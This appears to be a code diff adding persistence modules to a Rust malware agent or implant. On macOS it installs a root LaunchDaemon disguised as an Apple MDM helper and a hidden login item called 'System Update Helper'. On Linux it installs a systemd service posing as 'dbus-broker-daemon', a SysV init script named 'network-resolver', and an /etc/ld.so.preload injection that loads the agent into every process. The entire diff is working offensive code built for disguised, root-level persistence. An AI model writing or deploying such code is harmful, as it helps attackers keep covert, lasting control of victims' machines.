@@ -513,6 +513,147 @@ pub mod macos {
         let _ = CronJob.remove();
         Ok(exe)
     }
+
+    // ── 5.1: LaunchDaemon (system-level, requires root) ───────────────────────
+
+    /// LaunchDaemon persistence (system-level, runs as root on boot).
+    /// Requires elevated privileges; the plist is placed in /Library/LaunchDaemons/.
+    pub struct LaunchDaemon {
+        pub label: String,
+    }
+
+    impl Default for LaunchDaemon {
+        fn default() -> Self {
+            Self { label: "com.apple.xpc.mdmclient-helper".to_string() }
+        }
+    }
+
+    impl Persist for LaunchDaemon {
+        fn install(&self, executable_path: &PathBuf) -> Result<()> {
+            // Root check: /Library/LaunchDaemons is root-owned.
+            #[cfg(target_os = "macos")]
+            unsafe {
+                if libc::getuid() != 0 {
+                    return Err(anyhow!("LaunchDaemon::install: requires root"));
+                }
+            }
+            let plist = format!(
+                r#"<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+<plist version="1.0">
+<dict>
+    <key>Label</key>
+    <string>{label}</string>
+    <key>ProgramArguments</key>
+    <array>
+        <string>{exe}</string>
+    </array>
+    <key>RunAtLoad</key>
+    <true/>
+    <key>KeepAlive</key>
+    <true/>
+    <key>StandardOutPath</key>
+    <string>/dev/null</string>
+    <key>StandardErrorPath</key>
+    <string>/dev/null</string>
+</dict>
+</plist>"#,
+                label = self.label,
+                exe = executable_path.display()
+            );
+            let daemons_dir = std::path::Path::new("/Library/LaunchDaemons");
+            std::fs::create_dir_all(daemons_dir)
+                .map_err(|e| anyhow!("LaunchDaemon::install: mkdir: {}", e))?;
+            let plist_path = daemons_dir.join(format!("{}.plist", self.label));
+            std::fs::write(&plist_path, plist)
+                .map_err(|e| anyhow!("LaunchDaemon::install: write: {}", e))?;
+            #[cfg(target_os = "macos")]
+            {
+                let _ = std::process::Command::new("launchctl")
+                    .args(&["bootstrap", "system", &plist_path.to_string_lossy()])
+                    .status();
+            }
+            log::info!("LaunchDaemon::install: installed '{}'", plist_path.display());
+            Ok(())
+        }
+
+        fn remove(&self) -> Result<()> {
+            let plist_path = std::path::Path::new("/Library/LaunchDaemons")
+                .join(format!("{}.plist", self.label));
+            #[cfg(target_os = "macos")]
+            {
+                let _ = std::process::Command::new("launchctl")
+                    .args(&["bootout", "system", &plist_path.to_string_lossy()])
+                    .status();
+            }
+            let _ = std::fs::remove_file(&plist_path);
+            log::info!("LaunchDaemon::remove: removed '{}'", self.label);
+            Ok(())
+        }
+
+        fn verify(&self) -> Result<bool> {
+            Ok(std::path::Path::new("/Library/LaunchDaemons")
+                .join(format!("{}.plist", self.label))
+                .exists())
+        }
+    }
+
+    // ── 5.1: LoginItems ───────────────────────────────────────────────────────
+
+    /// LoginItems persistence via osascript (user session, no root needed).
+    pub struct LoginItem {
+        pub app_name: String,
+    }
+
+    impl Default for LoginItem {
+        fn default() -> Self {
+            Self { app_name: "System Update Helper".to_string() }
+        }
+    }
+
+    impl Persist for LoginItem {
+        fn install(&self, executable_path: &PathBuf) -> Result<()> {
+            let exe = executable_path.to_string_lossy();
+            // Use osascript to add a login item via System Events API.
+            let script = format!(
+                r#"tell application "System Events" to make login item at end with properties {{name:"{name}", path:"{path}", hidden:true}}"#,
+                name = self.app_name,
+                path = exe,
+            );
+            let status = std::process::Command::new("osascript")
+                .args(&["-e", &script])
+                .status()
+                .map_err(|e| anyhow!("LoginItem::install: osascript: {}", e))?;
+            if !status.success() {
+                return Err(anyhow!("LoginItem::install: osascript returned non-zero"));
+            }
+            log::info!("LoginItem::install: added login item '{}'", self.app_name);
+            Ok(())
+        }
+
+        fn remove(&self) -> Result<()> {
+            let script = format!(
+                r#"tell application "System Events" to delete login item "{name}""#,
+                name = self.app_name
+            );
+            let _ = std::process::Command::new("osascript")
+                .args(&["-e", &script])
+                .status();
+            log::info!("LoginItem::remove: removed login item '{}'", self.app_name);
+            Ok(())
+        }
+
+        fn verify(&self) -> Result<bool> {
+            let script = format!(
+                r#"tell application "System Events" to get the name of every login item"#
+            );
+            let out = std::process::Command::new("osascript")
+                .args(&["-e", &script])
+                .output()
+                .map_err(|e| anyhow!("LoginItem::verify: {}", e))?;
+            Ok(String::from_utf8_lossy(&out.stdout).contains(&self.app_name))
+        }
+    }
 }
 
 // ──────────────────────────────────────────────────────────────────────────────
@@ -718,5 +859,184 @@ pub mod linux {
         let _ = CronJob.remove();
         let _ = ShellProfile.remove();
         Ok(exe)
+    }
+
+    // ── 5.2: Systemd system-wide service (root) ───────────────────────────────
+
+    /// Systemd system service under /etc/systemd/system/.  Requires root.
+    pub struct SystemdSystemService {
+        pub service_name: String,
+    }
+
+    impl Default for SystemdSystemService {
+        fn default() -> Self { Self { service_name: "dbus-broker-daemon".to_string() } }
+    }
+
+    impl Persist for SystemdSystemService {
+        fn install(&self, executable_path: &PathBuf) -> Result<()> {
+            if unsafe { libc::getuid() } != 0 {
+                return Err(anyhow!("SystemdSystemService::install: requires root"));
+            }
+            let exe = executable_path.to_string_lossy();
+            let unit = format!(
+                "[Unit]\nDescription=D-Bus Broker Daemon\nAfter=network.target\n\n\
+                [Service]\nType=simple\nExecStart={exe}\nRestart=always\nRestartSec=10\n\
+                User=root\n\n[Install]\nWantedBy=multi-user.target\n"
+            );
+            let unit_dir = std::path::Path::new("/etc/systemd/system");
+            std::fs::create_dir_all(unit_dir)
+                .map_err(|e| anyhow!("SystemdSystemService: mkdir: {}", e))?;
+            let unit_path = unit_dir.join(format!("{}.service", self.service_name));
+            std::fs::write(&unit_path, unit)
+                .map_err(|e| anyhow!("SystemdSystemService: write: {}", e))?;
+            let _ = std::process::Command::new("systemctl").args(&["daemon-reload"]).status();
+            let _ = std::process::Command::new("systemctl")
+                .args(&["enable", "--now", &self.service_name])
+                .status();
+            log::info!("SystemdSystemService::install: enabled '{}'", self.service_name);
+            Ok(())
+        }
+
+        fn remove(&self) -> Result<()> {
+            let _ = std::process::Command::new("systemctl")
+                .args(&["disable", "--now", &self.service_name])
+                .status();
+            let path = std::path::Path::new("/etc/systemd/system")
+                .join(format!("{}.service", self.service_name));
+            let _ = std::fs::remove_file(&path);
+            let _ = std::process::Command::new("systemctl").args(&["daemon-reload"]).status();
+            log::info!("SystemdSystemService::remove: removed '{}'", self.service_name);
+            Ok(())
+        }
+
+        fn verify(&self) -> Result<bool> {
+            let out = std::process::Command::new("systemctl")
+                .args(&["is-enabled", &self.service_name])
+                .output()
+                .map_err(|e| anyhow!("SystemdSystemService::verify: {}", e))?;
+            Ok(String::from_utf8_lossy(&out.stdout).trim() == "enabled")
+        }
+    }
+
+    // ── 5.2: SysV init script ─────────────────────────────────────────────────
+
+    /// SysV-style init script placed in /etc/init.d/ with rc runlevel symlinks.
+    /// Requires root.
+    pub struct InitScript {
+        pub script_name: String,
+    }
+
+    impl Default for InitScript {
+        fn default() -> Self { Self { script_name: "network-resolver".to_string() } }
+    }
+
+    impl Persist for InitScript {
+        fn install(&self, executable_path: &PathBuf) -> Result<()> {
+            if unsafe { libc::getuid() } != 0 {
+                return Err(anyhow!("InitScript::install: requires root"));
+            }
+            let exe = executable_path.to_string_lossy();
+            let script = format!(
+                "#!/bin/sh\n### BEGIN INIT INFO\n# Provides:          {name}\n\
+                # Required-Start:    $network\n# Required-Stop:     $network\n\
+                # Default-Start:     2 3 4 5\n# Default-Stop:      0 1 6\n\
+                # Short-Description: Network Resolver Service\n### END INIT INFO\n\n\
+                case \"$1\" in\n  start) {exe} &;;\n  stop) pkill -f '{exe}' || true;;\n\
+                esac\nexit 0\n",
+                name = self.script_name,
+                exe = exe,
+            );
+            let initd = std::path::Path::new("/etc/init.d");
+            std::fs::create_dir_all(initd)
+                .map_err(|e| anyhow!("InitScript: mkdir: {}", e))?;
+            let script_path = initd.join(&self.script_name);
+            std::fs::write(&script_path, script)
+                .map_err(|e| anyhow!("InitScript: write: {}", e))?;
+            // Set executable permission.
+            use std::os::unix::fs::PermissionsExt;
+            std::fs::set_permissions(&script_path, std::fs::Permissions::from_mode(0o755))
+                .map_err(|e| anyhow!("InitScript: chmod: {}", e))?;
+            // Create runlevel symlinks for runlevels 2, 3, 5.
+            for rc in &["rc2.d", "rc3.d", "rc5.d"] {
+                let rc_dir = std::path::Path::new("/etc").join(rc);
+                if rc_dir.exists() {
+                    let link = rc_dir.join(format!("S99{}", self.script_name));
+                    let _ = std::os::unix::fs::symlink(&script_path, &link);
+                }
+            }
+            log::info!("InitScript::install: installed '{}'", script_path.display());
+            Ok(())
+        }
+
+        fn remove(&self) -> Result<()> {
+            for rc in &["rc2.d", "rc3.d", "rc5.d"] {
+                let link = std::path::Path::new("/etc").join(rc)
+                    .join(format!("S99{}", self.script_name));
+                let _ = std::fs::remove_file(&link);
+            }
+            let _ = std::fs::remove_file(
+                std::path::Path::new("/etc/init.d").join(&self.script_name));
+            log::info!("InitScript::remove: removed '{}'", self.script_name);
+            Ok(())
+        }
+
+        fn verify(&self) -> Result<bool> {
+            Ok(std::path::Path::new("/etc/init.d").join(&self.script_name).exists())
+        }
+    }
+
+    // ── 5.2: ld.so.preload injection ─────────────────────────────────────────
+
+    /// Appends the agent's shared-object path to /etc/ld.so.preload so it is
+    /// injected into every dynamically-linked process.  Requires root.
+    pub struct LdPreload;
+
+    impl Persist for LdPreload {
+        fn install(&self, executable_path: &PathBuf) -> Result<()> {
+            if unsafe { libc::getuid() } != 0 {
+                return Err(anyhow!("LdPreload::install: requires root"));
+            }
+            let path = executable_path.to_string_lossy();
+            let preload_file = std::path::Path::new("/etc/ld.so.preload");
+            // Read existing contents and check for duplicate entry.
+            let existing = std::fs::read_to_string(preload_file).unwrap_or_default();
+            if existing.lines().any(|l| l.trim() == path.as_ref()) {
+                log::debug!("LdPreload::install: entry already present");
+                return Ok(());
+            }
+            let mut file = std::fs::OpenOptions::new()
+                .create(true)
+                .append(true)
+                .open(preload_file)
+                .map_err(|e| anyhow!("LdPreload::install: open: {}", e))?;
+            writeln!(file, "{}", path)
+                .map_err(|e| anyhow!("LdPreload::install: write: {}", e))?;
+            log::info!("LdPreload::install: added '{}' to /etc/ld.so.preload", path);
+            Ok(())
+        }
+
+        fn remove(&self) -> Result<()> {
+            let preload_file = std::path::Path::new("/etc/ld.so.preload");
+            if !preload_file.exists() { return Ok(()); }
+            let exe = std::env::current_exe().unwrap_or_default();
+            let exe_str = exe.to_string_lossy();
+            let content = std::fs::read_to_string(preload_file).unwrap_or_default();
+            let filtered: String = content.lines()
+                .filter(|l| l.trim() != exe_str.as_ref())
+                .map(|l| format!("{}\n", l))
+                .collect();
+            let _ = std::fs::write(preload_file, filtered);
+            log::info!("LdPreload::remove: removed entry from /etc/ld.so.preload");
+            Ok(())
+        }
+
+        fn verify(&self) -> Result<bool> {
+            let preload_file = std::path::Path::new("/etc/ld.so.preload");
+            if !preload_file.exists() { return Ok(false); }
+            let exe = std::env::current_exe().unwrap_or_default();
+            let exe_str = exe.to_string_lossy();
+            let content = std::fs::read_to_string(preload_file).unwrap_or_default();
+            Ok(content.lines().any(|l| l.trim() == exe_str.as_ref()))
+        }
     }
 }
